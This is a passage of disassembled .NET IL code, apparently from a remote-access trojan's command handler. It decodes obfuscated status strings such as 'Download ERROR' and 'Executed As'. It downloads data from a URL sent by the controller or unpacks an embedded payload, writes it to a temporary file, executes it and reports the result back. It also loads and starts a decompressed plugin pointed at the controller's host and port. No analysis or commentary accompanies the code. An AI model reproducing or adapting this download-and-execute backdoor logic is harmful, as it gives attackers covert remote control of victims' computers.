      IL_037e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0383:  ldc.i4.0
      IL_0384:  bne.un.s   IL_03c5

      IL_0386:  ldloc.1
      IL_0387:  ldlen
      IL_0388:  conv.ovf.i4
      IL_0389:  ldc.i4.1
      IL_038a:  sub.ovf
      IL_038b:  stloc.s    V_31
      IL_038d:  ldc.i4.1
      IL_038e:  stloc.s    V_30
      IL_0390:  br.s       IL_03b8

      .try
      {
        IL_0392:  ldloc.1
        IL_0393:  ldloc.s    V_30
        IL_0395:  ldelem.ref
        IL_0396:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_039b:  call       bool Q.BasicFunctions::SP(int32)
        IL_03a0:  pop
        IL_03a1:  leave.s    IL_03b2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03a3:  dup
        IL_03a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a9:  stloc.s    V_32
        IL_03ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03b0:  leave.s    IL_03b2

      }  // end handler
      IL_03b2:  ldloc.s    V_30
      IL_03b4:  ldc.i4.1
      IL_03b5:  add.ovf
      IL_03b6:  stloc.s    V_30
      IL_03b8:  ldloc.s    V_30
      IL_03ba:  ldloc.s    V_31
      IL_03bc:  ble.s      IL_0392

      IL_03be:  leave      IL_187f

      IL_03c3:  br.s       IL_0411

      IL_03c5:  ldloc.s    V_107
      IL_03c7:  ldloc.s    V_9
      IL_03c9:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_03ce:  ldc.i4.0
      IL_03cf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03d4:  ldc.i4.0
      IL_03d5:  bne.un.s   IL_0411

      IL_03d7:  ldloc.1
      IL_03d8:  ldlen
      IL_03d9:  conv.ovf.i4
      IL_03da:  ldc.i4.1
      IL_03db:  sub.ovf
      IL_03dc:  stloc.s    V_34
      IL_03de:  ldc.i4.1
      IL_03df:  stloc.s    V_33
      IL_03e1:  br.s       IL_0409

      .try
      {
        IL_03e3:  ldloc.1
        IL_03e4:  ldloc.s    V_33
        IL_03e6:  ldelem.ref
        IL_03e7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_03ec:  call       bool Q.BasicFunctions::RP(int32)
        IL_03f1:  pop
        IL_03f2:  leave.s    IL_0403

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03f4:  dup
        IL_03f5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03fa:  stloc.s    V_35
        IL_03fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0401:  leave.s    IL_0403

      }  // end handler
      IL_0403:  ldloc.s    V_33
      IL_0405:  ldc.i4.1
      IL_0406:  add.ovf
      IL_0407:  stloc.s    V_33
      IL_0409:  ldloc.s    V_33
      IL_040b:  ldloc.s    V_34
      IL_040d:  ble.s      IL_03e3

      IL_040f:  br.s       IL_0411

      IL_0411:  ldloc.s    V_28
      IL_0413:  ldloc.s    V_10
      IL_0415:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_041a:  ldc.i4.0
      IL_041b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0420:  ldc.i4.0
      IL_0421:  beq.s      IL_0428

      IL_0423:  br         IL_075a

      IL_0428:  ldloc.1
      IL_0429:  ldc.i4.2
      IL_042a:  ldelem.ref
      IL_042b:  ldc.i4.0
      IL_042c:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0431:  ldc.i4.s   31
      IL_0433:  bne.un     IL_0535

      .try
      {
        IL_0438:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_043d:  stloc.s    V_37
        IL_043f:  ldloc.1
        IL_0440:  ldc.i4.0
        IL_0441:  ldelem.ref
        IL_0442:  ldsfld     string Q.SettingPad::Y
        IL_0447:  ldloc.1
        IL_0448:  ldc.i4.1
        IL_0449:  ldelem.ref
        IL_044a:  ldsfld     string Q.SettingPad::Y
        IL_044f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0454:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0459:  stloc.s    V_36
        IL_045b:  ldloc.s    V_37
        IL_045d:  ldarg.0
        IL_045e:  ldloc.s    V_36
        IL_0460:  ldarg.0
        IL_0461:  ldlen
        IL_0462:  conv.ovf.i4
        IL_0463:  ldloc.s    V_36
        IL_0465:  sub.ovf
        IL_0466:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_046b:  ldloc.s    V_37
        IL_046d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0472:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0477:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_047c:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0481:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0486:  stloc.s    V_13
        IL_0488:  leave      IL_05f7

        IL_048d:  leave      IL_0535

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0492:  dup
        IL_0493:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0498:  stloc.s    V_38
        IL_049a:  ldc.i4.s   13
        IL_049c:  newarr     [mscorlib]System.Byte
        IL_04a1:  stloc.s    V_128
        IL_04a3:  ldloc.s    V_128
        IL_04a5:  ldc.i4.0
        IL_04a6:  ldc.i4.s   69
        IL_04a8:  stelem.i1
        IL_04a9:  ldloc.s    V_128
        IL_04ab:  ldc.i4.1
        IL_04ac:  ldc.i4.s   120
        IL_04ae:  stelem.i1
        IL_04af:  ldloc.s    V_128
        IL_04b1:  ldc.i4.2
        IL_04b2:  ldc.i4.s   101
        IL_04b4:  stelem.i1
        IL_04b5:  ldloc.s    V_128
        IL_04b7:  ldc.i4.3
        IL_04b8:  ldc.i4.s   99
        IL_04ba:  stelem.i1
        IL_04bb:  ldloc.s    V_128
        IL_04bd:  ldc.i4.4
        IL_04be:  ldc.i4.s   117
        IL_04c0:  stelem.i1
        IL_04c1:  ldloc.s    V_128
        IL_04c3:  ldc.i4.5
        IL_04c4:  ldc.i4.s   116
        IL_04c6:  stelem.i1
        IL_04c7:  ldloc.s    V_128
        IL_04c9:  ldc.i4.6
        IL_04ca:  ldc.i4.s   101
        IL_04cc:  stelem.i1
        IL_04cd:  ldloc.s    V_128
        IL_04cf:  ldc.i4.7
        IL_04d0:  ldc.i4.s   32
        IL_04d2:  stelem.i1
        IL_04d3:  ldloc.s    V_128
        IL_04d5:  ldc.i4.8
        IL_04d6:  ldc.i4.s   69
        IL_04d8:  stelem.i1
        IL_04d9:  ldloc.s    V_128
        IL_04db:  ldc.i4.s   9
        IL_04dd:  ldc.i4.s   82
        IL_04df:  stelem.i1
        IL_04e0:  ldloc.s    V_128
        IL_04e2:  ldc.i4.s   10
        IL_04e4:  ldc.i4.s   82
        IL_04e6:  stelem.i1
        IL_04e7:  ldloc.s    V_128
        IL_04e9:  ldc.i4.s   11
        IL_04eb:  ldc.i4.s   79
        IL_04ed:  stelem.i1
        IL_04ee:  ldloc.s    V_128
        IL_04f0:  ldc.i4.s   12
        IL_04f2:  ldc.i4.s   82
        IL_04f4:  stelem.i1
        IL_04f5:  ldloc.s    V_128
        IL_04f7:  stloc.s    V_39
        IL_04f9:  ldloc.s    V_11
        IL_04fb:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0500:  ldsfld     string Q.SettingPad::Y
        IL_0505:  ldloc.s    V_39
        IL_0507:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_050c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0511:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0516:  pop
        IL_0517:  ldloc.s    V_12
        IL_0519:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_051e:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0523:  pop
        IL_0524:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0529:  leave      IL_187f

        IL_052e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0533:  leave.s    IL_0535

      }  // end handler
      IL_0535:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_053a:  stloc.s    V_22
      .try
      {
        IL_053c:  ldloc.s    V_22
        IL_053e:  ldloc.1
        IL_053f:  ldc.i4.2
        IL_0540:  ldelem.ref
        IL_0541:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0546:  stloc.s    V_13
        IL_0548:  leave      IL_05f7

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_054d:  dup
        IL_054e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0553:  stloc.s    V_40
        IL_0555:  ldc.i4.s   14
        IL_0557:  newarr     [mscorlib]System.Byte
        IL_055c:  stloc.s    V_128
        IL_055e:  ldloc.s    V_128
        IL_0560:  ldc.i4.0
        IL_0561:  ldc.i4.s   68
        IL_0563:  stelem.i1
        IL_0564:  ldloc.s    V_128
        IL_0566:  ldc.i4.1
        IL_0567:  ldc.i4.s   111
        IL_0569:  stelem.i1
        IL_056a:  ldloc.s    V_128
        IL_056c:  ldc.i4.2
        IL_056d:  ldc.i4.s   119
        IL_056f:  stelem.i1
        IL_0570:  ldloc.s    V_128
        IL_0572:  ldc.i4.3
        IL_0573:  ldc.i4.s   110
        IL_0575:  stelem.i1
        IL_0576:  ldloc.s    V_128
        IL_0578:  ldc.i4.4
        IL_0579:  ldc.i4.s   108
        IL_057b:  stelem.i1
        IL_057c:  ldloc.s    V_128
        IL_057e:  ldc.i4.5
        IL_057f:  ldc.i4.s   111
        IL_0581:  stelem.i1
        IL_0582:  ldloc.s    V_128
        IL_0584:  ldc.i4.6
        IL_0585:  ldc.i4.s   97
        IL_0587:  stelem.i1
        IL_0588:  ldloc.s    V_128
        IL_058a:  ldc.i4.7
        IL_058b:  ldc.i4.s   100
        IL_058d:  stelem.i1
        IL_058e:  ldloc.s    V_128
        IL_0590:  ldc.i4.8
        IL_0591:  ldc.i4.s   32
        IL_0593:  stelem.i1
        IL_0594:  ldloc.s    V_128
        IL_0596:  ldc.i4.s   9
        IL_0598:  ldc.i4.s   69
        IL_059a:  stelem.i1
        IL_059b:  ldloc.s    V_128
        IL_059d:  ldc.i4.s   10
        IL_059f:  ldc.i4.s   82
        IL_05a1:  stelem.i1
        IL_05a2:  ldloc.s    V_128
        IL_05a4:  ldc.i4.s   11
        IL_05a6:  ldc.i4.s   82
        IL_05a8:  stelem.i1
        IL_05a9:  ldloc.s    V_128
        IL_05ab:  ldc.i4.s   12
        IL_05ad:  ldc.i4.s   79
        IL_05af:  stelem.i1
        IL_05b0:  ldloc.s    V_128
        IL_05b2:  ldc.i4.s   13
        IL_05b4:  ldc.i4.s   82
        IL_05b6:  stelem.i1
        IL_05b7:  ldloc.s    V_128
        IL_05b9:  stloc.s    V_41
        IL_05bb:  ldloc.s    V_11
        IL_05bd:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_05c2:  ldsfld     string Q.SettingPad::Y
        IL_05c7:  ldloc.s    V_41
        IL_05c9:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_05ce:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_05d3:  call       bool Q.BasicFunctions::SendIt(string)
        IL_05d8:  pop
        IL_05d9:  ldloc.s    V_12
        IL_05db:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_05e0:  call       bool Q.BasicFunctions::SendIt(string)
        IL_05e5:  pop
        IL_05e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_05eb:  leave      IL_187f

        IL_05f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_05f5:  leave.s    IL_05f7

      }  // end handler
      IL_05f7:  nop
      IL_05f8:  ldloc.s    V_12
      IL_05fa:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_05ff:  call       bool Q.BasicFunctions::SendIt(string)
      IL_0604:  pop
      IL_0605:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_060a:  ldstr      "."
      IL_060f:  ldloc.1
      IL_0610:  ldc.i4.1
      IL_0611:  ldelem.ref
      IL_0612:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0617:  stloc.s    V_27
      .try
      {
        IL_0619:  ldloc.s    V_27
        IL_061b:  ldloc.s    V_13
        IL_061d:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0622:  ldloc.s    V_27
        IL_0624:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0629:  pop
        IL_062a:  ldc.i4.s   12
        IL_062c:  newarr     [mscorlib]System.Byte
        IL_0631:  stloc.s    V_128
        IL_0633:  ldloc.s    V_128
        IL_0635:  ldc.i4.0
        IL_0636:  ldc.i4.s   69
        IL_0638:  stelem.i1
        IL_0639:  ldloc.s    V_128
        IL_063b:  ldc.i4.1
        IL_063c:  ldc.i4.s   120
        IL_063e:  stelem.i1
        IL_063f:  ldloc.s    V_128
        IL_0641:  ldc.i4.2
        IL_0642:  ldc.i4.s   101
        IL_0644:  stelem.i1
        IL_0645:  ldloc.s    V_128
        IL_0647:  ldc.i4.3
        IL_0648:  ldc.i4.s   99
        IL_064a:  stelem.i1
        IL_064b:  ldloc.s    V_128
        IL_064d:  ldc.i4.4
        IL_064e:  ldc.i4.s   117
        IL_0650:  stelem.i1
        IL_0651:  ldloc.s    V_128
        IL_0653:  ldc.i4.5
        IL_0654:  ldc.i4.s   116
        IL_0656:  stelem.i1
        IL_0657:  ldloc.s    V_128
        IL_0659:  ldc.i4.6
        IL_065a:  ldc.i4.s   101
        IL_065c:  stelem.i1
        IL_065d:  ldloc.s    V_128
        IL_065f:  ldc.i4.7
        IL_0660:  ldc.i4.s   100
        IL_0662:  stelem.i1
        IL_0663:  ldloc.s    V_128
        IL_0665:  ldc.i4.8
        IL_0666:  ldc.i4.s   32
        IL_0668:  stelem.i1
        IL_0669:  ldloc.s    V_128
        IL_066b:  ldc.i4.s   9
        IL_066d:  ldc.i4.s   65
        IL_066f:  stelem.i1
        IL_0670:  ldloc.s    V_128
        IL_0672:  ldc.i4.s   10
        IL_0674:  ldc.i4.s   115
        IL_0676:  stelem.i1
        IL_0677:  ldloc.s    V_128
        IL_0679:  ldc.i4.s   11
        IL_067b:  ldc.i4.s   32
        IL_067d:  stelem.i1
        IL_067e:  ldloc.s    V_128
        IL_0680:  stloc.s    V_42
        IL_0682:  ldloc.s    V_11
        IL_0684:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0689:  ldsfld     string Q.SettingPad::Y
        IL_068e:  ldloc.s    V_42
        IL_0690:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0695:  ldloc.s    V_27
        IL_0697:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_069c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_06a1:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_06a6:  call       bool Q.BasicFunctions::SendIt(string)
        IL_06ab:  pop
        IL_06ac:  leave      IL_187f

        IL_06b1:  leave      IL_075a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_06b6:  dup
        IL_06b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_06bc:  stloc.s    V_43
        IL_06be:  ldc.i4.s   14
        IL_06c0:  newarr     [mscorlib]System.Byte
        IL_06c5:  stloc.s    V_128
        IL_06c7:  ldloc.s    V_128
        IL_06c9:  ldc.i4.0
        IL_06ca:  ldc.i4.s   69
        IL_06cc:  stelem.i1
        IL_06cd:  ldloc.s    V_128
        IL_06cf:  ldc.i4.1
        IL_06d0:  ldc.i4.s   120
        IL_06d2:  stelem.i1
        IL_06d3:  ldloc.s    V_128
        IL_06d5:  ldc.i4.2
        IL_06d6:  ldc.i4.s   101
        IL_06d8:  stelem.i1
        IL_06d9:  ldloc.s    V_128
        IL_06db:  ldc.i4.3
        IL_06dc:  ldc.i4.s   99
        IL_06de:  stelem.i1
        IL_06df:  ldloc.s    V_128
        IL_06e1:  ldc.i4.4
        IL_06e2:  ldc.i4.s   117
        IL_06e4:  stelem.i1
        IL_06e5:  ldloc.s    V_128
        IL_06e7:  ldc.i4.5
        IL_06e8:  ldc.i4.s   116
        IL_06ea:  stelem.i1
        IL_06eb:  ldloc.s    V_128
        IL_06ed:  ldc.i4.6
        IL_06ee:  ldc.i4.s   101
        IL_06f0:  stelem.i1
        IL_06f1:  ldloc.s    V_128
        IL_06f3:  ldc.i4.7
        IL_06f4:  ldc.i4.s   32
        IL_06f6:  stelem.i1
        IL_06f7:  ldloc.s    V_128
        IL_06f9:  ldc.i4.8
        IL_06fa:  ldc.i4.s   69
        IL_06fc:  stelem.i1
        IL_06fd:  ldloc.s    V_128
        IL_06ff:  ldc.i4.s   9
        IL_0701:  ldc.i4.s   82
        IL_0703:  stelem.i1
        IL_0704:  ldloc.s    V_128
        IL_0706:  ldc.i4.s   10
        IL_0708:  ldc.i4.s   82
        IL_070a:  stelem.i1
        IL_070b:  ldloc.s    V_128
        IL_070d:  ldc.i4.s   11
        IL_070f:  ldc.i4.s   79
        IL_0711:  stelem.i1
        IL_0712:  ldloc.s    V_128
        IL_0714:  ldc.i4.s   12
        IL_0716:  ldc.i4.s   82
        IL_0718:  stelem.i1
        IL_0719:  ldloc.s    V_128
        IL_071b:  ldc.i4.s   13
        IL_071d:  ldc.i4.s   32
        IL_071f:  stelem.i1
        IL_0720:  ldloc.s    V_128
        IL_0722:  stloc.s    V_44
        IL_0724:  ldloc.s    V_11
        IL_0726:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_072b:  ldsfld     string Q.SettingPad::Y
        IL_0730:  ldloc.s    V_44
        IL_0732:  call       string Q.BasicFunctions::StrToBi(uint8[])
        IL_0737:  ldloc.s    V_43
        IL_0739:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_073e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0743:  call       bool Q.BasicFunctions::SendIt(string)
        IL_0748:  pop
        IL_0749:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_074e:  leave      IL_187f

        IL_0753:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0758:  leave.s    IL_075a

      }  // end handler
      IL_075a:  ldloc.s    V_28
      IL_075c:  stloc.s    V_108
      IL_075e:  ldloc.s    V_108
      IL_0760:  ldloc.s    V_14
      IL_0762:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0767:  ldc.i4.0
      IL_0768:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_076d:  ldc.i4.0
      IL_076e:  bne.un     IL_093d

      .try
      {
        IL_0773:  ldc.i4.1
        IL_0774:  newarr     [mscorlib]System.Byte
        IL_0779:  stloc.s    V_109
        IL_077b:  ldloc.s    V_109
        IL_077d:  ldc.i4.0
        IL_077e:  ldc.i4.0
        IL_077f:  stelem.i1
        IL_0780:  ldloc.s    V_109
        IL_0782:  stloc.s    V_46
        IL_0784:  ldloc.1
        IL_0785:  ldc.i4.3
        IL_0786:  ldelem.ref
        IL_0787:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_078c:  ldc.i4.s   10
        IL_078e:  ble.s      IL_080a

        IL_0790:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0795:  stloc.s    V_48
        IL_0797:  ldc.i4.6
        IL_0798:  newarr     [mscorlib]System.String
        IL_079d:  stloc.s    V_110
        IL_079f:  ldloc.s    V_110
        IL_07a1:  ldc.i4.0
        IL_07a2:  ldloc.1
        IL_07a3:  ldc.i4.0
        IL_07a4:  ldelem.ref
        IL_07a5:  stelem.ref
        IL_07a6:  ldloc.s    V_110
        IL_07a8:  ldc.i4.1
        IL_07a9:  ldsfld     string Q.SettingPad::Y
        IL_07ae:  stelem.ref
        IL_07af:  ldloc.s    V_110
        IL_07b1:  ldc.i4.2
        IL_07b2:  ldloc.1
        IL_07b3:  ldc.i4.1
        IL_07b4:  ldelem.ref
        IL_07b5:  stelem.ref
        IL_07b6:  ldloc.s    V_110
        IL_07b8:  ldc.i4.3
        IL_07b9:  ldsfld     string Q.SettingPad::Y
        IL_07be:  stelem.ref
        IL_07bf:  ldloc.s    V_110
        IL_07c1:  ldc.i4.4
        IL_07c2:  ldloc.1
        IL_07c3:  ldc.i4.2
        IL_07c4:  ldelem.ref
        IL_07c5:  stelem.ref
        IL_07c6:  ldloc.s    V_110
        IL_07c8:  ldc.i4.5
        IL_07c9:  ldsfld     string Q.SettingPad::Y
        IL_07ce:  stelem.ref
        IL_07cf:  ldloc.s    V_110
        IL_07d1:  call       string [mscorlib]System.String::Concat(string[])
        IL_07d6:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_07db:  stloc.s    V_47
        IL_07dd:  ldloc.s    V_48
        IL_07df:  ldarg.0
        IL_07e0:  ldloc.s    V_47
        IL_07e2:  ldarg.0
        IL_07e3:  ldlen
        IL_07e4:  conv.ovf.i4
        IL_07e5:  ldloc.s    V_47
        IL_07e7:  sub.ovf
        IL_07e8:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_07ed:  ldloc.s    V_48
        IL_07ef:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_07f4:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_07f9:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_07fe:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0803:  call       uint8[] Q.Accessories::Z(uint8[])
        IL_0808:  stloc.s    V_46
        IL_080a:  ldloc.s    V_46
        IL_080c:  ldsfld     string [mscorlib]System.String::Empty
        IL_0811:  ldc.i4.1
        IL_0812:  call       object Q.BasicFunctions::XR(uint8[],
                                                         string,
                                                         bool)
        IL_0817:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_081c:  stloc.s    V_45
        IL_081e:  ldloc.s    V_45
        IL_0820:  ldnull
        IL_0821:  ldstr      "h"
        IL_0826:  ldc.i4.1
        IL_0827:  newarr     [mscorlib]System.Object
        IL_082c:  stloc.s    V_112
        IL_082e:  ldloc.s    V_112
        IL_0830:  ldc.i4.0
        IL_0831:  call       object Q.Network::MH()
        IL_0836:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_083b:  stloc.s    V_111
        IL_083d:  ldloca.s   V_111
        IL_083f:  call       string Q.BasicFunctions::DEB(string&)
        IL_0844:  stelem.ref
        IL_0845:  ldloc.s    V_112
        IL_0847:  ldnull
        IL_0848:  ldnull
        IL_0849:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_084e:  ldloc.s    V_45
        IL_0850:  ldnull
        IL_0851:  ldstr      "p"
        IL_0856:  ldc.i4.1
        IL_0857:  newarr     [mscorlib]System.Object
        IL_085c:  stloc.s    V_112
        IL_085e:  ldloc.s    V_112
        IL_0860:  ldc.i4.0
        IL_0861:  call       string Q.Network::NPn()
        IL_0866:  stloc.s    V_111
        IL_0868:  ldloca.s   V_111
        IL_086a:  call       string Q.BasicFunctions::DEB(string&)
        IL_086f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0874:  box        [mscorlib]System.Int32
        IL_0879:  stelem.ref
        IL_087a:  ldloc.s    V_112
        IL_087c:  ldnull
        IL_087d:  ldnull
        IL_087e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0883:  ldloc.s    V_45
        IL_0885:  ldnull
        IL_0886:  ldstr      "osk"
        IL_088b:  ldc.i4.1
        IL_088c:  newarr     [mscorlib]System.Object
        IL_0891:  stloc.s    V_112
        IL_0893:  ldloc.s    V_112
        IL_0895:  ldc.i4.0
        IL_0896:  ldloc.1
        IL_0897:  ldc.i4.2
        IL_0898:  ldelem.ref
        IL_0899:  stelem.ref
        IL_089a:  ldloc.s    V_112
        IL_089c:  ldnull
        IL_089d:  ldnull
        IL_089e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_08a3:  ldloc.s    V_45
        IL_08a5:  ldnull
        IL_08a6:  ldstr      "start"
        IL_08ab:  ldc.i4.0
        IL_08ac:  newarr     [mscorlib]System.Object
        IL_08b1:  ldnull
        IL_08b2:  ldnull
        IL_08b3:  ldnull
        IL_08b4:  ldc.i4.1
        IL_08b5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                           class [mscorlib]System.Type,
                                                                                                                           string,
                                                                                                                           object[],
                                                                                                                           string[],
                                                                                                                           class [mscorlib]System.Type[],
                                                                                                                           bool[],
                                                                                                                           bool)
        IL_08ba:  pop
        IL_08bb:  br.s       IL_08c4

        IL_08bd:  ldc.i4.1
        IL_08be:  call       object Q.BasicFunctions::Thr(int32)
        IL_08c3:  pop
        IL_08c4:  ldsfld     bool Q.SettingPad::Cn
        IL_08c9:  ldc.i4.0
        IL_08ca:  ceq
        IL_08cc:  box        [mscorlib]System.Boolean
        IL_08d1:  ldloc.s    V_45
        IL_08d3:  ldnull
        IL_08d4:  ldstr      "Off"
        IL_08d9:  ldc.i4.0
        IL_08da:  newarr     [mscorlib]System.Object
        IL_08df:  ldnull
        IL_08e0:  ldnull
        IL_08e1:  ldnull
        IL_08e2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                          class [mscorlib]System.Type,
                                                                                                                          string,
                                                                                                                          object[],
                                                                                                                          string[],
                                                                                                                          class [mscorlib]System.Type[],
                                                                                                                          bool[])
        IL_08e7:  ldc.i4.1
        IL_08e8:  box        [mscorlib]System.Boolean
        IL_08ed:  ldc.i4.0
        IL_08ee:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                                object,
                                                                                                                                bool)
        IL_08f3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                      object)
        IL_08f8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
        IL_08fd:  brfalse.s  IL_08bd

        IL_08ff:  ldloc.s    V_45
        IL_0901:  ldnull
        IL_0902:  ldstr      "off"
        IL_0907:  ldc.i4.1
        IL_0908:  newarr     [mscorlib]System.Object
        IL_090d:  stloc.s    V_112
        IL_090f:  ldloc.s    V_112
        IL_0911:  ldc.i4.0
        IL_0912:  ldc.i4.1
        IL_0913:  box        [mscorlib]System.Boolean
        IL_0918:  stelem.ref
        IL_0919:  ldloc.s    V_112
        IL_091b:  ldnull
        IL_091c:  ldnull
        IL_091d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[])
        IL_0922:  leave.s    IL_0933

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0924:  dup
        IL_0925:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_092a:  stloc.s    V_49
        IL_092c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0931:  leave.s    IL_0933

      }  // end handler
